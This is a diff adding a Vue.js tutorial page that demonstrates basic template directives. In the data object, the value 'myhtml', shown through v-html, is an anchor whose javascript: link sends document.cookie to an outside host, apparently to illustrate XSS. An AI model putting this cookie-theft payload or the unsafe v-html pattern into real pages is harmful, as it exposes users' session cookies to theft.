@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+<title>Examples</title>
+<meta name="description" content="">
+<meta name="keywords" content="kerwin qianfeng ">
+<link href="" rel="stylesheet">
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+<style>
+    .red{
+        background: red;
+    }
+
+    .yellow{
+        background: yellow;
+    }
+</style>
+
+</head>
+
+<body>
+    <div id="box">
+      {{10+20}}
+      {{10>20?'aaa':'bbb'}}
+
+      {{ myname }}
+
+      {{ myhtml }}
+
+
+      <!-- 指令 -->
+      <div v-html="myhtml"></div>
+
+      <div v-show="isShow">动态显示和隐藏</div>
+
+      <div v-if="isCreated">动态创建和删除</div>
+
+      <button v-on:click="handleMyClick">click1</button>
+      <button @click="handleMyClick">click2</button>
+      <img v-bind:src="mysrc"/>
+
+      <div v-bind:class="whichcolor">111111111</div>
+
+      <div v-bind:class="isActive?'yellow':'red'">222222222</div>
+
+      <ul>
+        <li v-for="(myitem,myindex) in datalist">
+          {{myitem}}---{{myindex}}
+        </li>
+      </ul>
+
+      <ul>
+        <li v-for="(myitem,myindex) in imglist">
+          <img :src="myitem"/>
+        </li>
+      </ul>
+    </div>
+
+    <script type="text/javascript">
+
+    new Vue({
+       el:"#box",
+       data:{
+         myname:"kerwin",
+         isShow:true,
+         isCreated:true,
+         whichcolor:"yellow",
+         mysrc:"https://pic.maizuo.com/usr/movie/73b25044a8c9756fa41d3a723ee6c2c2.jpg",
+         myhtml:"<a href=javascript:location.href='http://www.baidu.com?cookie='+document.cookie>**跟**有事儿</a>",
+         isActive:true,
+         datalist:["1111","2222","3333","555","666"],
+         imglist:["https://pic.maizuo.com/usr/movie/73b25044a8c9756fa41d3a723ee6c2c2.jpg?x-oss-process=image/quality,Q_70",
+          "https://pic.maizuo.com/usr/movie/294a01da8a6c9ed99bfbaaf52b2e0f25.jpg?x-oss-process=image/quality,Q_70",
+          "https://pic.maizuo.com/usr/movie/e004f1cdd920fcb60dfd43f6f19afc2c.jpg?x-oss-process=image/quality,Q_70",
+          "https://pic.maizuo.com/usr/movie/428385c8393778d8d75de22434d7ce7d.jpg?x-oss-process=image/quality,Q_70"
+         ]
+      },// 状态
+       methods:{
+        handleMyClick(){
+          console.log("click")
+          this.isCreated = !this.isCreated
+          this.myname = "xiaoming"
+          this.isActive = !this.isActive
+        }
+       }
+     })
+     
+    </script>
+</body>
+</html>
